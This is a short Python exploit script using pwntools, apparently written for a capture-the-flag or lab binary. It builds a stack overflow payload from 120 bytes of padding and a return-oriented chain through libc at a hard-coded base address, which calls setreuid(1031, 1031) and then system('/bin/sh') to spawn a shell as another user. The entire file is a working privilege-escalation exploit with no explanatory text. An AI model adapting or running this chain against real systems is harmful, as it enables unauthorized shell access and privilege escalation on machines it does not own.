import sys
from pwn import *

context.log_level = "critical"
context.arch = 'amd64'

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x7ffff7c00000
rop = ROP(libc, badchars=b"\n")
rop.setreuid(1031, 1031)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))

payload = b"A" * 120
payload += rop.chain()
payload += b"\n"

sys.stdout.buffer.write(payload)